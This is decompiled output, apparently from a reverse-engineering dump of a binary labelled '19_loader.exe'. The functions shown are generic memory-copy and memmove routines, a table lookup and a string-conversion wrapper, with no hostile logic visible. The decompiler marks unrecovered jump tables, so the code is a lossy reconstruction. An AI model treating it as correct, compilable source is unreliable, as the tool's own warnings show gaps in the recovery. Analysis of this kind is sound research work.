          *(undefined1 (*) [32])(pauVar24[2] + uVar31) = auVar3;
        case 0x181:
        case 0x182:
        case 0x183:
        case 0x184:
        case 0x185:
        case 0x186:
        case 0x187:
        case 0x188:
        case 0x189:
        case 0x18a:
        case 0x18b:
        case 0x18c:
        case 0x18d:
        case 0x18e:
        case 399:
        case 400:
        case 0x191:
        case 0x192:
        case 0x193:
        case 0x194:
        case 0x195:
        case 0x196:
        case 0x197:
        case 0x198:
        case 0x199:
        case 0x19a:
        case 0x19b:
        case 0x19c:
        case 0x19d:
        case 0x19e:
        case 0x19f:
        case 0x1a0:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[3] + uVar31));
          *(undefined1 (*) [32])(pauVar24[3] + uVar31) = auVar3;
        case 0x161:
        case 0x162:
        case 0x163:
        case 0x164:
        case 0x165:
        case 0x166:
        case 0x167:
        case 0x168:
        case 0x169:
        case 0x16a:
        case 0x16b:
        case 0x16c:
        case 0x16d:
        case 0x16e:
        case 0x16f:
        case 0x170:
        case 0x171:
        case 0x172:
        case 0x173:
        case 0x174:
        case 0x175:
        case 0x176:
        case 0x177:
        case 0x178:
        case 0x179:
        case 0x17a:
        case 0x17b:
        case 0x17c:
        case 0x17d:
        case 0x17e:
        case 0x17f:
        case 0x180:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[4] + uVar31));
          *(undefined1 (*) [32])(pauVar24[4] + uVar31) = auVar3;
        case 0x141:
        case 0x142:
        case 0x143:
        case 0x144:
        case 0x145:
        case 0x146:
        case 0x147:
        case 0x148:
        case 0x149:
        case 0x14a:
        case 0x14b:
        case 0x14c:
        case 0x14d:
        case 0x14e:
        case 0x14f:
        case 0x150:
        case 0x151:
        case 0x152:
        case 0x153:
        case 0x154:
        case 0x155:
        case 0x156:
        case 0x157:
        case 0x158:
        case 0x159:
        case 0x15a:
        case 0x15b:
        case 0x15c:
        case 0x15d:
        case 0x15e:
        case 0x15f:
        case 0x160:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[5] + uVar31));
          *(undefined1 (*) [32])(pauVar24[5] + uVar31) = auVar3;
        case 0x121:
        case 0x122:
        case 0x123:
        case 0x124:
        case 0x125:
        case 0x126:
        case 0x127:
        case 0x128:
        case 0x129:
        case 0x12a:
        case 299:
        case 300:
        case 0x12d:
        case 0x12e:
        case 0x12f:
        case 0x130:
        case 0x131:
        case 0x132:
        case 0x133:
        case 0x134:
        case 0x135:
        case 0x136:
        case 0x137:
        case 0x138:
        case 0x139:
        case 0x13a:
        case 0x13b:
        case 0x13c:
        case 0x13d:
        case 0x13e:
        case 0x13f:
        case 0x140:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[6] + uVar31));
          *(undefined1 (*) [32])(pauVar24[6] + uVar31) = auVar3;
        default:
          puVar26 = (undefined8 *)(pauVar24[-1] + uVar29);
          *puVar26 = uVar32;
          puVar26[1] = uVar33;
          puVar26[2] = uVar14;
          puVar26[3] = uVar15;
        case 0x100:
          *param_1 = uVar10;
          param_1[1] = uVar11;
          param_1[2] = uVar12;
          param_1[3] = uVar13;
          return;
        }
      }
      do {
        uVar10 = *(undefined8 *)(*pauVar27 + 8);
        uVar11 = *(undefined8 *)(*pauVar27 + 0x10);
        uVar12 = *(undefined8 *)(*pauVar27 + 0x18);
        uVar13 = *(undefined8 *)pauVar27[1];
        uVar32 = *(undefined8 *)(pauVar27[1] + 8);
        uVar33 = *(undefined8 *)(pauVar27[1] + 0x10);
        uVar14 = *(undefined8 *)(pauVar27[1] + 0x18);
        uVar15 = *(undefined8 *)pauVar27[2];
        uVar16 = *(undefined8 *)(pauVar27[2] + 8);
        uVar17 = *(undefined8 *)(pauVar27[2] + 0x10);
        uVar18 = *(undefined8 *)(pauVar27[2] + 0x18);
        uVar19 = *(undefined8 *)pauVar27[3];
        uVar20 = *(undefined8 *)(pauVar27[3] + 8);
        uVar21 = *(undefined8 *)(pauVar27[3] + 0x10);
        uVar22 = *(undefined8 *)(pauVar27[3] + 0x18);
        *(undefined8 *)*pauVar23 = *(undefined8 *)*pauVar27;
        *(undefined8 *)(*pauVar23 + 8) = uVar10;
        *(undefined8 *)(*pauVar23 + 0x10) = uVar11;
        *(undefined8 *)(*pauVar23 + 0x18) = uVar12;
        *(undefined8 *)pauVar23[1] = uVar13;
        *(undefined8 *)(pauVar23[1] + 8) = uVar32;
        *(undefined8 *)(pauVar23[1] + 0x10) = uVar33;
        *(undefined8 *)(pauVar23[1] + 0x18) = uVar14;
        *(undefined8 *)pauVar23[2] = uVar15;
        *(undefined8 *)(pauVar23[2] + 8) = uVar16;
        *(undefined8 *)(pauVar23[2] + 0x10) = uVar17;
        *(undefined8 *)(pauVar23[2] + 0x18) = uVar18;
        *(undefined8 *)pauVar23[3] = uVar19;
        *(undefined8 *)(pauVar23[3] + 8) = uVar20;
        *(undefined8 *)(pauVar23[3] + 0x10) = uVar21;
        *(undefined8 *)(pauVar23[3] + 0x18) = uVar22;
        uVar10 = *(undefined8 *)(pauVar27[4] + 8);
        uVar11 = *(undefined8 *)(pauVar27[4] + 0x10);
        uVar12 = *(undefined8 *)(pauVar27[4] + 0x18);
        uVar13 = *(undefined8 *)pauVar27[5];
        uVar32 = *(undefined8 *)(pauVar27[5] + 8);
        uVar33 = *(undefined8 *)(pauVar27[5] + 0x10);
        uVar14 = *(undefined8 *)(pauVar27[5] + 0x18);
        uVar15 = *(undefined8 *)pauVar27[6];
        uVar16 = *(undefined8 *)(pauVar27[6] + 8);
        uVar17 = *(undefined8 *)(pauVar27[6] + 0x10);
        uVar18 = *(undefined8 *)(pauVar27[6] + 0x18);
        uVar19 = *(undefined8 *)pauVar27[7];
        uVar20 = *(undefined8 *)(pauVar27[7] + 8);
        uVar21 = *(undefined8 *)(pauVar27[7] + 0x10);
        uVar22 = *(undefined8 *)(pauVar27[7] + 0x18);
        *(undefined8 *)pauVar23[4] = *(undefined8 *)pauVar27[4];
        *(undefined8 *)(pauVar23[4] + 8) = uVar10;
        *(undefined8 *)(pauVar23[4] + 0x10) = uVar11;
        *(undefined8 *)(pauVar23[4] + 0x18) = uVar12;
        *(undefined8 *)pauVar23[5] = uVar13;
        *(undefined8 *)(pauVar23[5] + 8) = uVar32;
        *(undefined8 *)(pauVar23[5] + 0x10) = uVar33;
        *(undefined8 *)(pauVar23[5] + 0x18) = uVar14;
        *(undefined8 *)pauVar23[6] = uVar15;
        *(undefined8 *)(pauVar23[6] + 8) = uVar16;
        *(undefined8 *)(pauVar23[6] + 0x10) = uVar17;
        *(undefined8 *)(pauVar23[6] + 0x18) = uVar18;
        *(undefined8 *)pauVar23[7] = uVar19;
        *(undefined8 *)(pauVar23[7] + 8) = uVar20;
        *(undefined8 *)(pauVar23[7] + 0x10) = uVar21;
        *(undefined8 *)(pauVar23[7] + 0x18) = uVar22;
        pauVar23 = pauVar23 + 8;
        pauVar27 = pauVar27 + 8;
        param_3 = param_3 - 0x100;
      } while (0xff < param_3);
    }
  }
                    /* WARNING: Could not recover jumptable at 0x00014001c502. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
            *(uint *)(&DAT_140095690 + (param_3 + 0x1f >> 5) * 4)))();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1c6e0 | partial_markers_remain ===== */
/* address=14001c6e0 rva=0x1c6e0 */

void FUN_14001c6e0(undefined8 *param_1,undefined8 *param_2,ulonglong param_3)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined1 uVar3;
  undefined2 uVar4;
  undefined4 uVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  undefined8 uVar8;
  undefined8 uVar9;
  undefined8 uVar10;
  undefined8 uVar11;
  undefined8 *puVar12;
  undefined8 *puVar13;
  ulonglong uVar14;
  longlong lVar15;
  ulonglong uVar16;
  undefined8 uVar17;
  undefined8 uVar18;
  
  switch(param_3) {
  case 0:
    return;
  case 1:
    *(undefined1 *)param_1 = *(undefined1 *)param_2;
    return;
  case 2:
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    return;
  case 3:
    uVar3 = *(undefined1 *)((longlong)param_2 + 2);
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    *(undefined1 *)((longlong)param_1 + 2) = uVar3;
    return;
  case 4:
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    return;
  case 5:
    uVar3 = *(undefined1 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined1 *)((longlong)param_1 + 4) = uVar3;
    return;
  case 6:
    uVar4 = *(undefined2 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar4;
    return;
  case 7:
    uVar4 = *(undefined2 *)((longlong)param_2 + 4);
    uVar3 = *(undefined1 *)((longlong)param_2 + 6);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar4;
    *(undefined1 *)((longlong)param_1 + 6) = uVar3;
    return;
  case 8:
    *param_1 = *param_2;
    return;
  case 9:
    uVar3 = *(undefined1 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined1 *)(param_1 + 1) = uVar3;
    return;
  case 10:
    uVar4 = *(undefined2 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar4;
    return;
  case 0xb:
    uVar4 = *(undefined2 *)(param_2 + 1);
    uVar3 = *(undefined1 *)((longlong)param_2 + 10);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar4;
    *(undefined1 *)((longlong)param_1 + 10) = uVar3;
    return;
  case 0xc:
    uVar5 = *(undefined4 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar5;
    return;
  case 0xd:
    uVar5 = *(undefined4 *)(param_2 + 1);
    uVar3 = *(undefined1 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar5;
    *(undefined1 *)((longlong)param_1 + 0xc) = uVar3;
    return;
  case 0xe:
    uVar5 = *(undefined4 *)(param_2 + 1);
    uVar4 = *(undefined2 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar5;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar4;
    return;
  case 0xf:
    uVar5 = *(undefined4 *)(param_2 + 1);
    uVar4 = *(undefined2 *)((longlong)param_2 + 0xc);
    uVar3 = *(undefined1 *)((longlong)param_2 + 0xe);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar5;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar4;
    *(undefined1 *)((longlong)param_1 + 0xe) = uVar3;
    return;
  }
  if (param_3 < 0x21) {
    uVar6 = param_2[1];
    puVar12 = (undefined8 *)((longlong)param_2 + (param_3 - 0x10));
    uVar7 = *puVar12;
    uVar8 = puVar12[1];
    *param_1 = *param_2;
    param_1[1] = uVar6;
    puVar12 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    *puVar12 = uVar7;
    puVar12[1] = uVar8;
    return;
  }
  puVar12 = (undefined8 *)((longlong)param_2 + param_3);
  if (param_1 <= param_2) {
    puVar12 = param_1;
  }
  if (param_1 < puVar12) {
    uVar6 = *param_2;
    uVar7 = param_2[1];
    lVar15 = (longlong)param_2 - (longlong)param_1;
    puVar12 = (undefined8 *)((longlong)param_1 + lVar15 + (param_3 - 0x10));
    uVar8 = *puVar12;
    uVar9 = puVar12[1];
    puVar13 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    uVar14 = param_3 - 0x10;
    puVar12 = puVar13;
    uVar17 = uVar8;
    uVar18 = uVar9;
    if (((ulonglong)puVar13 & 0xf) != 0) {
      puVar12 = (undefined8 *)((ulonglong)puVar13 & 0xfffffffffffffff0);
      uVar17 = *(undefined8 *)((longlong)puVar12 + lVar15);
      uVar18 = ((undefined8 *)((longlong)puVar12 + lVar15))[1];
      *puVar13 = uVar8;
      *(undefined8 *)((longlong)param_1 + (param_3 - 8)) = uVar9;
      uVar14 = (longlong)puVar12 - (longlong)param_1;
    }
    uVar16 = uVar14 >> 7;
    if (uVar16 != 0) {
      *puVar12 = uVar17;
      puVar12[1] = uVar18;
      puVar13 = puVar12;
      while( true ) {
        puVar1 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x10);
        uVar8 = puVar1[1];
        puVar12 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x20);
        uVar9 = *puVar12;
        uVar17 = puVar12[1];
        puVar12 = puVar13 + -0x10;
        puVar13[-2] = *puVar1;
        puVar13[-1] = uVar8;
        puVar13[-4] = uVar9;
        puVar13[-3] = uVar17;
        puVar1 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x30);
        uVar8 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x40);
        uVar9 = *puVar2;
        uVar17 = puVar2[1];
        uVar16 = uVar16 - 1;
        puVar13[-6] = *puVar1;
        puVar13[-5] = uVar8;
        puVar13[-8] = uVar9;
        puVar13[-7] = uVar17;
        puVar1 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x50);
        uVar8 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x60);
        uVar9 = *puVar2;
        uVar17 = puVar2[1];
        puVar13[-10] = *puVar1;
        puVar13[-9] = uVar8;
        puVar13[-0xc] = uVar9;
        puVar13[-0xb] = uVar17;
        puVar1 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x70);
        uVar8 = *puVar1;
        uVar9 = puVar1[1];
        uVar17 = *(undefined8 *)((longlong)puVar12 + lVar15);
        uVar18 = ((undefined8 *)((longlong)puVar12 + lVar15))[1];
        if (uVar16 == 0) break;
        puVar13[-0xe] = uVar8;
        puVar13[-0xd] = uVar9;
        *puVar12 = uVar17;
        puVar13[-0xf] = uVar18;
        puVar13 = puVar12;
      }
      puVar13[-0xe] = uVar8;
      puVar13[-0xd] = uVar9;
      uVar14 = uVar14 & 0x7f;
    }
    for (uVar16 = uVar14 >> 4; uVar16 != 0; uVar16 = uVar16 - 1) {
      *puVar12 = uVar17;
      puVar12[1] = uVar18;
      puVar12 = puVar12 + -2;
      uVar17 = *(undefined8 *)((longlong)puVar12 + lVar15);
      uVar18 = ((undefined8 *)((longlong)puVar12 + lVar15))[1];
    }
    if ((uVar14 & 0xf) != 0) {
      *param_1 = uVar6;
      param_1[1] = uVar7;
    }
    *puVar12 = uVar17;
    puVar12[1] = uVar18;
    return;
  }
  if (0x7ff < param_3) {
    for (; param_3 != 0; param_3 = param_3 - 1) {
      *(undefined1 *)param_1 = *(undefined1 *)param_2;
      param_2 = (undefined8 *)((longlong)param_2 + 1);
      param_1 = (undefined8 *)((longlong)param_1 + 1);
    }
    return;
  }
  uVar6 = *param_2;
  if (0x80 < param_3) {
    lVar15 = ((ulonglong)param_1 & 0xf) - 0x10;
    puVar12 = (undefined8 *)((longlong)param_1 - lVar15);
    puVar13 = (undefined8 *)((longlong)param_2 - lVar15);
    param_3 = param_3 + lVar15;
    if (0x80 < param_3) {
      do {
        uVar7 = puVar13[1];
        uVar8 = puVar13[2];
        uVar9 = puVar13[3];
        uVar17 = puVar13[4];
        uVar18 = puVar13[5];
        uVar10 = puVar13[6];
        uVar11 = puVar13[7];
        *puVar12 = *puVar13;
        puVar12[1] = uVar7;
        puVar12[2] = uVar8;
        puVar12[3] = uVar9;
        puVar12[4] = uVar17;
        puVar12[5] = uVar18;
        puVar12[6] = uVar10;
        puVar12[7] = uVar11;
        uVar7 = puVar13[9];
        uVar8 = puVar13[10];
        uVar9 = puVar13[0xb];
        uVar17 = puVar13[0xc];
        uVar18 = puVar13[0xd];
        uVar10 = puVar13[0xe];
        uVar11 = puVar13[0xf];
        puVar12[8] = puVar13[8];
        puVar12[9] = uVar7;
        puVar12[10] = uVar8;
        puVar12[0xb] = uVar9;
        puVar12[0xc] = uVar17;
        puVar12[0xd] = uVar18;
        puVar12[0xe] = uVar10;
        puVar12[0xf] = uVar11;
        puVar12 = puVar12 + 0x10;
        puVar13 = puVar13 + 0x10;
        param_3 = param_3 - 0x80;
      } while (0x7f < param_3);
    }
  }
                    /* WARNING: Could not recover jumptable at 0x00014001c906. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
            *(uint *)(&DAT_140095720 + (param_3 + 0xf >> 4) * 4)))(uVar6);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1c990 | partial_markers_remain ===== */
/* address=14001c990 rva=0x1c990 */

void FUN_14001c990(undefined8 *param_1,undefined8 *param_2,ulonglong param_3)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined1 uVar3;
  undefined2 uVar4;
  undefined4 uVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  undefined8 uVar8;
  undefined8 uVar9;
  undefined8 uVar10;
  undefined8 uVar11;
  undefined8 *puVar12;
  undefined8 *puVar13;
  ulonglong uVar14;
  longlong lVar15;
  ulonglong uVar16;
  undefined8 uVar17;
  undefined8 uVar18;
  
  switch(param_3) {
  case 0:
    return;
  case 1:
    *(undefined1 *)param_1 = *(undefined1 *)param_2;
    return;
  case 2:
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    return;
  case 3:
    uVar3 = *(undefined1 *)((longlong)param_2 + 2);
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    *(undefined1 *)((longlong)param_1 + 2) = uVar3;
    return;
  case 4:
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    return;
  case 5:
    uVar3 = *(undefined1 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined1 *)((longlong)param_1 + 4) = uVar3;
    return;
  case 6:
    uVar4 = *(undefined2 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar4;
    return;
  case 7:
    uVar4 = *(undefined2 *)((longlong)param_2 + 4);
    uVar3 = *(undefined1 *)((longlong)param_2 + 6);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar4;
    *(undefined1 *)((longlong)param_1 + 6) = uVar3;
    return;
  case 8:
    *param_1 = *param_2;
    return;
  case 9:
    uVar3 = *(undefined1 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined1 *)(param_1 + 1) = uVar3;
    return;
  case 10:
    uVar4 = *(undefined2 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar4;
    return;
  case 0xb:
    uVar4 = *(undefined2 *)(param_2 + 1);
    uVar3 = *(undefined1 *)((longlong)param_2 + 10);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar4;
    *(undefined1 *)((longlong)param_1 + 10) = uVar3;
    return;
  case 0xc:
    uVar5 = *(undefined4 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar5;
    return;
  case 0xd:
    uVar5 = *(undefined4 *)(param_2 + 1);
    uVar3 = *(undefined1 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar5;
    *(undefined1 *)((longlong)param_1 + 0xc) = uVar3;
    return;
  case 0xe:
    uVar5 = *(undefined4 *)(param_2 + 1);
    uVar4 = *(undefined2 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar5;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar4;
    return;
  case 0xf:
    uVar5 = *(undefined4 *)(param_2 + 1);
    uVar4 = *(undefined2 *)((longlong)param_2 + 0xc);
    uVar3 = *(undefined1 *)((longlong)param_2 + 0xe);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar5;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar4;
    *(undefined1 *)((longlong)param_1 + 0xe) = uVar3;
    return;
  }
  if (param_3 < 0x21) {
    uVar6 = param_2[1];
    puVar12 = (undefined8 *)((longlong)param_2 + (param_3 - 0x10));
    uVar7 = *puVar12;
    uVar8 = puVar12[1];
    *param_1 = *param_2;
    param_1[1] = uVar6;
    puVar12 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    *puVar12 = uVar7;
    puVar12[1] = uVar8;
    return;
  }
  puVar12 = (undefined8 *)((longlong)param_2 + param_3);
  if (param_1 <= param_2) {
    puVar12 = param_1;
  }
  if (param_1 < puVar12) {
    uVar6 = *param_2;
    uVar7 = param_2[1];
    lVar15 = (longlong)param_2 - (longlong)param_1;
    puVar12 = (undefined8 *)((longlong)param_1 + lVar15 + (param_3 - 0x10));
    uVar8 = *puVar12;
    uVar9 = puVar12[1];
    puVar13 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    uVar14 = param_3 - 0x10;
    puVar12 = puVar13;
    uVar17 = uVar8;
    uVar18 = uVar9;
    if (((ulonglong)puVar13 & 0xf) != 0) {
      puVar12 = (undefined8 *)((ulonglong)puVar13 & 0xfffffffffffffff0);
      uVar17 = *(undefined8 *)((longlong)puVar12 + lVar15);
      uVar18 = ((undefined8 *)((longlong)puVar12 + lVar15))[1];
      *puVar13 = uVar8;
      *(undefined8 *)((longlong)param_1 + (param_3 - 8)) = uVar9;
      uVar14 = (longlong)puVar12 - (longlong)param_1;
    }
    uVar16 = uVar14 >> 7;
    if (uVar16 != 0) {
      *puVar12 = uVar17;
      puVar12[1] = uVar18;
      puVar13 = puVar12;
      while( true ) {
        puVar1 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x10);
        uVar8 = puVar1[1];
        puVar12 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x20);
        uVar9 = *puVar12;
        uVar17 = puVar12[1];
        puVar12 = puVar13 + -0x10;
        puVar13[-2] = *puVar1;
        puVar13[-1] = uVar8;
        puVar13[-4] = uVar9;
        puVar13[-3] = uVar17;
        puVar1 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x30);
        uVar8 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x40);
        uVar9 = *puVar2;
        uVar17 = puVar2[1];
        uVar16 = uVar16 - 1;
        puVar13[-6] = *puVar1;
        puVar13[-5] = uVar8;
        puVar13[-8] = uVar9;
        puVar13[-7] = uVar17;
        puVar1 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x50);
        uVar8 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x60);
        uVar9 = *puVar2;
        uVar17 = puVar2[1];
        puVar13[-10] = *puVar1;
        puVar13[-9] = uVar8;
        puVar13[-0xc] = uVar9;
        puVar13[-0xb] = uVar17;
        puVar1 = (undefined8 *)((longlong)puVar13 + lVar15 + -0x70);
        uVar8 = *puVar1;
        uVar9 = puVar1[1];
        uVar17 = *(undefined8 *)((longlong)puVar12 + lVar15);
        uVar18 = ((undefined8 *)((longlong)puVar12 + lVar15))[1];
        if (uVar16 == 0) break;
        puVar13[-0xe] = uVar8;
        puVar13[-0xd] = uVar9;
        *puVar12 = uVar17;
        puVar13[-0xf] = uVar18;
        puVar13 = puVar12;
      }
      puVar13[-0xe] = uVar8;
      puVar13[-0xd] = uVar9;
      uVar14 = uVar14 & 0x7f;
    }
    for (uVar16 = uVar14 >> 4; uVar16 != 0; uVar16 = uVar16 - 1) {
      *puVar12 = uVar17;
      puVar12[1] = uVar18;
      puVar12 = puVar12 + -2;
      uVar17 = *(undefined8 *)((longlong)puVar12 + lVar15);
      uVar18 = ((undefined8 *)((longlong)puVar12 + lVar15))[1];
    }
    if ((uVar14 & 0xf) != 0) {
      *param_1 = uVar6;
      param_1[1] = uVar7;
    }
    *puVar12 = uVar17;
    puVar12[1] = uVar18;
    return;
  }
  if (0x7ff < param_3) {
    for (; param_3 != 0; param_3 = param_3 - 1) {
      *(undefined1 *)param_1 = *(undefined1 *)param_2;
      param_2 = (undefined8 *)((longlong)param_2 + 1);
      param_1 = (undefined8 *)((longlong)param_1 + 1);
    }
    return;
  }
  uVar6 = *param_2;
  if (0x80 < param_3) {
    lVar15 = ((ulonglong)param_1 & 0xf) - 0x10;
    puVar12 = (undefined8 *)((longlong)param_1 - lVar15);
    puVar13 = (undefined8 *)((longlong)param_2 - lVar15);
    param_3 = param_3 + lVar15;
    if (0x80 < param_3) {
      do {
        uVar7 = puVar13[1];
        uVar8 = puVar13[2];
        uVar9 = puVar13[3];
        uVar17 = puVar13[4];
        uVar18 = puVar13[5];
        uVar10 = puVar13[6];
        uVar11 = puVar13[7];
        *puVar12 = *puVar13;
        puVar12[1] = uVar7;
        puVar12[2] = uVar8;
        puVar12[3] = uVar9;
        puVar12[4] = uVar17;
        puVar12[5] = uVar18;
        puVar12[6] = uVar10;
        puVar12[7] = uVar11;
        uVar7 = puVar13[9];
        uVar8 = puVar13[10];
        uVar9 = puVar13[0xb];
        uVar17 = puVar13[0xc];
        uVar18 = puVar13[0xd];
        uVar10 = puVar13[0xe];
        uVar11 = puVar13[0xf];
        puVar12[8] = puVar13[8];
        puVar12[9] = uVar7;
        puVar12[10] = uVar8;
        puVar12[0xb] = uVar9;
        puVar12[0xc] = uVar17;
        puVar12[0xd] = uVar18;
        puVar12[0xe] = uVar10;
        puVar12[0xf] = uVar11;
        puVar12 = puVar12 + 0x10;
        puVar13 = puVar13 + 0x10;
        param_3 = param_3 - 0x80;
      } while (0x7f < param_3);
    }
  }
                    /* WARNING: Could not recover jumptable at 0x00014001cbb6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
            *(uint *)(&DAT_140095790 + (param_3 + 0xf >> 4) * 4)))(uVar6);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1cc30 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001cc30 rva=0x1cc30 */

undefined4 FUN_14001cc30(ushort *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  if (param_1 != (ushort *)0x0) {
    iVar4 = 0;
    iVar5 = 0xe3;
    do {
      iVar2 = (iVar5 + iVar4) / 2;
      iVar3 = FUN_14001f810(param_1,(ushort *)(&PTR_DAT_14008d9f0)[(longlong)iVar2 * 2],0x55);
      if (iVar3 == 0) {
        iVar5 = *(int *)(&DAT_14008d9f8 + (longlong)iVar2 * 0x10);
        if (iVar5 < 0) {
          return 0;
        }
        if ((ulonglong)(longlong)iVar5 < 0xe4) {
          return *(undefined4 *)(&DAT_14008cbb0 + (longlong)iVar5 * 0x10);
        }
        return 0;
      }
      iVar1 = iVar2 + -1;
      if (-1 < iVar3) {
        iVar4 = iVar2 + 1;
        iVar1 = iVar5;
      }
      iVar5 = iVar1;
    } while (iVar4 <= iVar5);
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1ccd8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001ccd8 rva=0x1ccd8 */

void FUN_14001ccd8(undefined4 *param_1,ushort *param_2,uint param_3,char *param_4,int param_5,
                  undefined8 param_6,int param_7,UINT param_8,int param_9)

{
  longlong local_28;
  longlong local_20 [2];
  char local_10;
  
  FUN_14001743c(&local_28,param_1);
  FUN_14001cd70(local_20,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
  if (local_10 != '\0') {
    *(uint *)(local_28 + 0x3a8) = *(uint *)(local_28 + 0x3a8) & 0xfffffffd;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1cd70 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001cd70 rva=0x1cd70 */

void FUN_14001cd70(longlong *param_1,ushort *param_2,uint param_3,char *param_4,int param_5,
                  undefined8 param_6,int param_7,UINT param_8,int param_9)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  ulonglong uVar4;
  longlong lVar5;
  undefined4 *puVar6;
  ulonglong uVar7;
  undefined8 uVar8;
  LPCWSTR pWVar9;
  undefined1 *puVar10;
  undefined1 *puVar11;
  undefined1 *puVar12;
  undefined4 *puVar13;
  undefined1 auStackY_88 [32];
  undefined4 local_38 [2];
  ulonglong local_30;
  
  local_30 = DAT_1400dfc40 ^ (ulonglong)local_38;
  iVar3 = param_5;
  if (0 < param_5) {
    iVar1 = FUN_140020f30(param_4,(longlong)param_5);
    iVar3 = iVar1 + 1;
    if (param_5 <= iVar1) {
      iVar3 = iVar1;
    }
  }
  if (param_8 == 0) {
    param_8 = *(UINT *)(*param_1 + 0xc);
  }
  uVar2 = FUN_140019c24(param_8,(-(uint)(param_9 != 0) & 8) + 1,param_4,iVar3,(LPWSTR)0x0,0);
  puVar12 = auStackY_88;
  if (uVar2 == 0) goto LAB_14001d07b;
  uVar4 = (longlong)(int)uVar2 * 2 + 0x10;
  uVar4 = -(ulonglong)((ulonglong)((longlong)(int)uVar2 * 2) < uVar4) & uVar4;
  if (uVar4 == 0) {
    pWVar9 = (LPCWSTR)0x0;
    puVar12 = auStackY_88;
LAB_14001d061:
    if (pWVar9 == (LPCWSTR)0x0) goto LAB_14001d07b;
  }
  else {
    if (uVar4 < 0x401) {
      uVar7 = uVar4 + 0xf;
      if (uVar7 <= uVar4) {
        uVar7 = 0xffffffffffffff0;
      }
      uVar7 = uVar7 & 0xfffffffffffffff0;
      FUN_140013c00();
      lVar5 = -uVar7;
      puVar10 = auStackY_88 + lVar5;
      puVar13 = (undefined4 *)((longlong)local_38 + lVar5);
